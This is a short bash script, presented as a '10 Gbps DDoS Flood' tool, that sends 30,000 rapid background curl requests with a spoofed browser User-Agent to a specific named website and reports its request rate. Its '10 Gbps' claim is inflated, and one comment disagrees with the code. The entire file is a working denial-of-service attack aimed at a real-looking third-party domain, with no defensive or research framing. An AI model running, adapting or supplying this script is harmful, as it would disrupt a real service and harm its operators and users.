#!/bin/bash
# 10 Gbps DDoS Flood - Aggressive Version
TARGET="https://www.nadiavpn.web.id/"
DURATION=30

echo "============================================"
echo "  10 Gbps DDoS Flood Attack (Aggressive)"
echo "  Target: $TARGET"
echo "  Duration: ${DURATION}s"
echo "============================================"
echo "  Starting at $(date)"
echo "  ============================================"

START=$(date +%s)

# Send continuous bursts without waiting
for BURST in $(seq 1 300); do
    for i in $(seq 1 100); do
        curl -s -o /dev/null -w "" \
            --max-time 10 \
            --connect-timeout 5 \
            --compressed \
            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
            "$TARGET" &
    done
    
    # Don't wait - immediately send next burst
    # Every 10 bursts, print progress
    if [ $((BURST % 30)) -eq 0 ]; then
        NOW=$(date +%s)
        ELAPSED=$((NOW - START))
        TOTAL=$((BURST * 100))
        echo "  [${ELAPSED}s] Sent: ${TOTAL} requests | Rate: $((TOTAL / (ELAPSED > 0 ? ELAPSED : 1))) req/s"
    fi
done

echo ""
echo "  All requests dispatched, waiting for completion..."
wait

END=$(date +%s)
ELAPSED=$((END - START))
TOTAL=$((300 * 100))

echo "============================================"
echo "  ATTACK COMPLETE"
echo "  Total Requests: $TOTAL"
echo "  Duration: ${ELAPSED}s"
echo "  Avg Rate: $((TOTAL / (ELAPSED > 0 ? ELAPSED : 1))) req/s"
echo "============================================"
